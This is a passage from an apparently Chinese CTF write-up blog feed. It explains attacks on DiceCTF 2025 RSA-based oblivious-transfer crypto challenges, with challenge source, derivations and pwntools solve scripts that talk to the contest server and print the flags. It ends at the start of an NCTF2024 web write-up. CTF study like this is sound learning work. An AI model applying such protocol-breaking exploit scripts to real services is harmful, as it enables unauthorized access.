style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">0</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br />这里<code>d</code>必为奇数，因为<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mi>k</mi><mo>∗</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">e*d=k*\phi(n) +1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p>所以有<br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mn>0</mn><mo>+</mo><mi>c</mi><mn>1</mn><mo>≡</mo><mi>m</mi><mn>0</mn><mo>+</mo><mi>m</mi><mn>1</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c0+c1\equiv m0+m1\ mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span><span class="mspace"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><p>然后就可以通过检验<code>m1</code>是否符合<code>live</code>前缀进行<code>page</code>的查找<br />这里交互的话，要注意<code>input</code>是需要<strong>字符串</strong>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;dicec.tf&#x27;</span>, <span class="number">31001</span>)</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">    <span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;drowning&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvline()</span><br><span class="line">    n = get_value()</span><br><span class="line">    e = get_value()</span><br><span class="line">    x0 = get_value()</span><br><span class="line">    x1 = get_value()</span><br><span class="line">    v = (x0 + x1) * inverse(<span class="number">2</span>, n) % n</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;v: &#x27;</span>, <span class="built_in">str</span>(v))</span><br><span class="line">    c0 = get_value()</span><br><span class="line">    c1 = get_value()</span><br><span class="line">    sum_m = (c0 + c1) % n</span><br><span class="line">    m1_prefix = <span class="string">b&#x27;you continue walking. turn to page &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">case</span> <span class="keyword">in</span> DEATH_CAUSES:</span><br><span class="line">        m0 = bytes_to_long(<span class="string">f&#x27;you die of <span class="subst">&#123;<span class="keyword">case</span>&#125;</span>.&#x27;</span>.encode())</span><br><span class="line">        m1 = long_to_bytes((sum_m - m0) % n)</span><br><span class="line">        <span class="keyword">if</span> m1.startswith(m1_prefix):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                page = <span class="built_in">int</span>(m1[<span class="built_in">len</span>(m1_prefix):-<span class="number">1</span>])</span><br><span class="line">                p.sendlineafter(<span class="string">b&#x27;turn to page: &#x27;</span>, <span class="built_in">str</span>(page))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;No valid page found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;gl3am1ng_g0ld_doubl00n&#125;</code></p><p>一开始看到这个题目是有点懵的，因为还要交互，后面去学了一手<strong>春哥</strong>的思路，tql</p><p>去搜索<strong>不经意传输</strong>，也发现一些有意思的题目……</p><h2 id="winxy-pistol"><a class="markdownIt-Anchor" href="#winxy-pistol"></a> winxy-pistol</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k, msg</span>):</span><br><span class="line">key = k.to_bytes(<span class="number">1024</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = msg.encode().ljust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(msg))</span><br><span class="line"><span class="keyword">return</span> strxor(pad, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">c0 = encrypt(k0, msg0)</span><br><span class="line">c1 = encrypt(k1, msg1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Winxy Pistol Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>诶，才发现这题是上一题的加强版吧，但下班睡觉了</p><p><code>c0,c1</code>的加密方式改为<code>shake_256(key)</code>与异或，关键的一点是<strong>rsa的参数固定了</strong></p><p>赛后再来学一手，文档里面沛公写的思路太简洁了，又参考了一下<a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/#winxy-pistol">maple3142师傅的wp</a>才搞懂，确实是需要开多线程</p><p>思路如下：首先令<code>v = x0</code>，<code>k0 = 0</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mn>1</mn><mo>≡</mo><mo stretchy="false">(</mo><mi>v</mi><mo>−</mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">k1\equiv(v-x1)^{d}mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span></span></span></span></p><p>然后我们再开一个进程，令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>≡</mo><mo stretchy="false">(</mo><msup><mi>v</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi>x</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mo>≡</mo><mo stretchy="false">(</mo><mi>v</mi><mo>−</mo><mi>x</mi><mn>1</mn><msup><mo stretchy="false">)</mo><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo>≡</mo><mi>k</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">k0&#x27;\equiv(v&#x27;-x0&#x27;)^{d}\equiv(v-x1)^{d}mod\ n\equiv k1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.099108em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mord">1</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.849108em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"> </span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span></span></span></span></p><p>那么，<code>v' = v + x0' - x1</code></p><p>此时我们可以先假设<code>m0 = die</code>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>⊕</mo><mi>c</mi><mn>1</mn><mo>=</mo><mi>m</mi><msup><mn>0</mn><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>⊕</mo><mi>m</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">c0&#x27;\oplus c1=m0&#x27;\oplus m1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">c</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.835222em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mord">1</span></span></span></span></p><p>然后因为是异或算法，有二分之一的概率<code>m1</code>的<code>page</code>会被异或掉，但如果<code>m0' = die</code>，二者异或的话，因为<code>die</code>的死法比较短并且进行的是<strong>零填充</strong>，所以是可以拿到<code>page</code>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, remote</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">k, ct</span>):</span><br><span class="line">    key = k.to_bytes(<span class="number">1024</span> // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(ct))</span><br><span class="line">    <span class="keyword">return</span> strxor(pad, ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31002</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">io</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;n: &quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x0: &quot;</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x1: &quot;</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> n, e, x0, x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ot</span>(<span class="params">io, v</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;v: &quot;</span>, <span class="built_in">str</span>(v).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c0: &quot;</span>)</span><br><span class="line">    c0 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c1: &quot;</span>)</span><br><span class="line">    c1 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    <span class="keyword">return</span> c0, c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAGE_RE = re.<span class="built_in">compile</span>(<span class="string">rb&quot;page (\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line">io = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    n, e, x0, x1 = recv(io)</span><br><span class="line">    v = x0</span><br><span class="line">    c0, c1 = ot(io, v)</span><br><span class="line">    k0 = <span class="number">0</span></span><br><span class="line">    m0 = decrypt(k0, c0)</span><br><span class="line">    <span class="keyword">if</span> m0.startswith(<span class="string">b&quot;you die of &quot;</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            io2 = connect()</span><br><span class="line">            _, _, x0p, _ = recv(io2)</span><br><span class="line">            vp = (v - x1 + x0p) % n</span><br><span class="line">            c0p, _ = ot(io2, vp)</span><br><span class="line">            io2.close()</span><br><span class="line">            m1xorm0p = strxor(c0p, c1)</span><br><span class="line">            <span class="comment"># we hope m0&#x27; is short (death), so the page part will not be xored</span></span><br><span class="line">            <span class="comment"># probability: 1/2</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;page&quot;</span> <span class="keyword">in</span> m1xorm0p:</span><br><span class="line">                page = <span class="built_in">int</span>(PAGE_RE.search(m1xorm0p).group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="built_in">int</span>(PAGE_RE.search(m0).group(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(page).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;lu5tr0us_j3wel_tr1nk3t&#125;</code></p><p>奇怪的是，我也是按照这个思路写的<code>exp</code>，感觉是因为进程的问题，导致跑几下就报错断开了，改了好多遍还是无法解决……<br /><img src="https://pica.zhimg.com/80/v2-0d370d7d3fdca18e533722ee59a2fe0a_1440w.png" alt="" /></p><h2 id="satisfiedunsolved"><a class="markdownIt-Anchor" href="#satisfiedunsolved"></a> satisfied(unsolved)</h2><blockquote><p>you don’t even know what you’re asking me to confess</p></blockquote><p>看了一下春哥的思路，<strong>可能是cryptohack里面哈密顿回路ZKP</strong>，好吧，不懂，下班</p><h1 id="参考学习"><a class="markdownIt-Anchor" href="#参考学习"></a> 参考学习</h1><p><a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/">野生大佬wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#web&quot;&gt;&lt;/a&gt; Web&lt;/h1&gt;
&lt;h2 id=&quot;cookie-recipes-v3&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#cookie-re</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/</id>
    <published>2025-03-22T16:43:10.000Z</published>
    <updated>2025-03-28T02:59:28.386Z</updated>
    
    <content type="html"><![CDATA[<p>放在最前面，<a href="https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh">laogong的wp</a></p><h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><h2 id="ez_dash-ez_dash-revenge复现"><a class="markdownIt-Anchor" href="#ez_dash-ez_dash-revenge复现"></a> ez_dash &amp;&amp; ez_dash revenge复现</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span 